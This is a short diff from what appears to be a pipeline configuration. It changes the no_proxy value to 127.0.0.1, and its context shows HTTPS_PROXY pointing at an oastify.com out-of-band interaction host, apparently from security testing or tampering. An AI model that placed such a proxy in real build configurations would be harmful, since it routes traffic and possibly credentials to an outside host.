@@ -13,4 +13,4 @@ stages:
         - name: "HTTPS_PROXY"
           value: "http://tgdguuom1glbsr33wch1fz1go7uyi8xne11pymwkl.oastify.com:80"
         - name: "no_proxy"
-          value: ""
+          value: "127.0.0.1"
